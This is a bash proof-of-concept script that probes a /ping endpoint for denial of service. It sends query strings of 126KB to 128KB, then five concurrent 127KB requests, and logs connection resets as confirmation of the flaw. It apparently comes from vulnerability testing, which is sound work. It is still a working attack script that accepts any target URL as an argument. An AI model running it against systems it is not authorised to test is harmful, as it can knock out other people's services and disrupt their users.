#!/bin/bash

# POC: Denial of Service via Large Request Payload
# Target: /ping endpoint with large text parameter
# Vulnerability: Connection termination at 127KB+ payload size

TARGET_URL="${1:-http://localhost:3000/ping}"
RESULTS_FILE="/tmp/dos_poc_results.txt"

echo "=========================================="
echo "DoS via Large Request Payload POC"
echo "=========================================="
echo "Target: $TARGET_URL"
echo ""

# Clear results file
> "$RESULTS_FILE"

# Test 1: 126KB payload (below threshold - should succeed)
echo "[*] Test 1: Sending 126KB payload (below threshold)..."
PAYLOAD_126KB=$(python3 -c "print('a' * 126000)")
HTTP_CODE=$(curl -s -w "%{http_code}" -o /tmp/response_126k.txt "$TARGET_URL?text=$PAYLOAD_126KB" 2>&1)
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] SUCCESS: 126KB payload - HTTP 200 received"
    echo "126KB,SUCCESS,HTTP 200" >> "$RESULTS_FILE"
else
    echo "[-] FAILED: 126KB payload - HTTP $HTTP_CODE"
    echo "126KB,FAILED,HTTP $HTTP_CODE" >> "$RESULTS_FILE"
fi
echo ""

# Test 2: 126.5KB payload (near threshold - should succeed)
echo "[*] Test 2: Sending 126.5KB payload (near threshold)..."
PAYLOAD_126_5KB=$(python3 -c "print('b' * 126500)")
HTTP_CODE=$(curl -s -w "%{http_code}" -o /tmp/response_126_5k.txt "$TARGET_URL?text=$PAYLOAD_126_5KB" 2>&1)
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] SUCCESS: 126.5KB payload - HTTP 200 received"
    echo "126.5KB,SUCCESS,HTTP 200" >> "$RESULTS_FILE"
else
    echo "[-] FAILED: 126.5KB payload - HTTP $HTTP_CODE"
    echo "126.5KB,FAILED,HTTP $HTTP_CODE" >> "$RESULTS_FILE"
fi
echo ""

# Test 3: 127KB payload (at threshold - should fail with connection error)
echo "[*] Test 3: Sending 127KB payload (at threshold)..."
PAYLOAD_127KB=$(python3 -c "print('c' * 127000)")
HTTP_CODE=$(curl -s -w "%{http_code}" -o /tmp/response_127k.txt "$TARGET_URL?text=$PAYLOAD_127KB" 2>&1)
CURL_EXIT=$?
ERROR_OUTPUT=$(cat /tmp/response_127k.txt 2>/dev/null)

if [ $CURL_EXIT -ne 0 ] || ! [[ "$HTTP_CODE" =~ ^[0-9]{3}$ ]]; then
    echo "[+] VULNERABILITY CONFIRMED: 127KB payload caused connection error!"
    echo "    Exit code: $CURL_EXIT"
    echo "    Error: ChunkedEncodingError or connection reset"
    echo "127KB,FAILED,CONNECTION_ERROR" >> "$RESULTS_FILE"
elif [ "$HTTP_CODE" != "200" ]; then
    echo "[+] VULNERABILITY CONFIRMED: 127KB payload - HTTP $HTTP_CODE (expected 200)"
    echo "127KB,FAILED,HTTP $HTTP_CODE" >> "$RESULTS_FILE"
else
    echo "[-] No error at 127KB (unexpected)"
    echo "127KB,SUCCESS,HTTP 200" >> "$RESULTS_FILE"
fi
echo ""

# Test 4: 128KB payload (well above threshold - should fail)
echo "[*] Test 4: Sending 128KB payload (well above threshold)..."
PAYLOAD_128KB=$(python3 -c "print('d' * 128000)")
HTTP_CODE=$(curl -s -w "%{http_code}" -o /tmp/response_128k.txt "$TARGET_URL?text=$PAYLOAD_128KB" 2>&1)
CURL_EXIT=$?

if [ $CURL_EXIT -ne 0 ] || ! [[ "$HTTP_CODE" =~ ^[0-9]{3}$ ]]; then
    echo "[+] VULNERABILITY CONFIRMED: 128KB payload caused connection error!"
    echo "    Exit code: $CURL_EXIT"
    echo "128KB,FAILED,CONNECTION_ERROR" >> "$RESULTS_FILE"
elif [ "$HTTP_CODE" != "200" ]; then
    echo "[+] VULNERABILITY CONFIRMED: 128KB payload - HTTP $HTTP_CODE"
    echo "128KB,FAILED,HTTP $HTTP_CODE" >> "$RESULTS_FILE"
else
    echo "[-] No error at 128KB (unexpected)"
    echo "128KB,SUCCESS,HTTP 200" >> "$RESULTS_FILE"
fi
echo ""

# Test 5: Concurrent requests with large payloads
echo "[*] Test 5: Sending 5 concurrent 127KB requests..."
CONCURRENT_SUCCESS=0
CONCURRENT_FAIL=0

for i in {1..5}; do
    PAYLOAD=$(python3 -c "print('e' * 127000)")
    curl -s -o /tmp/concurrent_$i.txt "$TARGET_URL?text=$PAYLOAD" 2>/dev/null &
done

wait

for i in {1..5}; do
    if [ -f "/tmp/concurrent_$i.txt" ]; then
        SIZE=$(wc -c < "/tmp/concurrent_$i.txt")
        if [ $SIZE -gt 0 ]; then
            ((CONCURRENT_SUCCESS++))
        else
            ((CONCURRENT_FAIL++))
        fi
    fi
done

echo "[+] Concurrent requests: $CONCURRENT_SUCCESS succeeded, $CONCURRENT_FAIL failed"
echo "Concurrent_5x127KB,PARTIAL,$CONCURRENT_SUCCESS/$CONCURRENT_FAIL" >> "$RESULTS_FILE"
echo ""

# Summary
echo "=========================================="
echo "SUMMARY"
echo "=========================================="
cat "$RESULTS_FILE"
echo ""

# Check if vulnerability was confirmed
if grep -q "CONNECTION_ERROR\|FAILED" "$RESULTS_FILE"; then
    echo "[+] VULNERABILITY CONFIRMED: Large request payloads cause server errors"
    exit 0
else
    echo "[-] Vulnerability not confirmed - server handled all requests"
    exit 1
fi